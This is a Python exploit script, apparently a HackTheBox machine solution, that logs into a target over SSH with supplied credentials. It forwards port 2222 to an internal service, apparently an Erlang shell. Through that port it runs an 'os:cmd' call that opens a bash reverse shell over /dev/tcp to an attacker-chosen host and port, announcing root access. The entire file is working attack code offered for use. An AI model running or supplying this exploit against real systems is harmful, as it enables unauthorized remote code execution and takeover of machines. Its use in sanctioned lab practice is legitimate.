#!/usr/bin/env python3

'''
Author: Uday
X: https://x.com/udaypro2008
Github: https://github.com/ExtremeUday
HackTheBox : ExtremeUday2
'''

import argparse
import paramiko
import subprocess
import time


parser = argparse.ArgumentParser(description="Remote SSH Command Executor")
parser.add_argument('-ip', help="Target IP", required=True)
parser.add_argument('-user', help="Enter the Username", required=True)
parser.add_argument('-passwd', help="Enter the Password", required=True)
parser.add_argument('-lhost', help="Local Host (for reverse shell)", required=True)
parser.add_argument('-lport', help="Local Port (for reverse shell)", required=True)

args = parser.parse_args()


def pf():
	print("[+] Setting up port forwarding...")
	try:
		command = [
			'sshpass', '-p', args.passwd,
			'ssh', '-fN',  
			'-L', f'2222:127.0.0.1:2222',
			'-o', 'StrictHostKeyChecking=no',
			f'{args.user}@{args.ip}'
		]
		subprocess.run(command, check=True)
		print("[+] Port forwarding started on localhost:2222")
	except subprocess.CalledProcessError as e:
		print(f"[-] Failed to start port forwarding: {e}")

def rce():
	print("[+] Attempting SSH connection on forwarded port 2222...")
	ssh_client = paramiko.SSHClient()
	ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh_client.connect(
			hostname='127.0.0.1',
			port=2222,
			username=args.user,
			password=args.passwd
		)
		print(f"[+] Connected to 127.0.0.1:2222 as {args.user}")

        
		stdin, stdout, stderr = ssh_client.exec_command(f"os:cmd(\"bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'\").")
		output = stdout.read().decode().strip()
		error = stderr.read().decode().strip()

		if output:
			print("[+] Command Output:")
			print(output)
		if error:
			print("[!] Command Error:")
			print(error)

		ssh_client.close()

	except paramiko.AuthenticationException:
		print("[-] Authentication failed.")
	except paramiko.SSHException as e:
		print(f"[-] SSH error: {e}")
	except Exception as e:
		print(f"[-] Unexpected error: {e}")
	print("[+] Check You Listener We Have The Root")



pf()
time.sleep(2)  
rce()
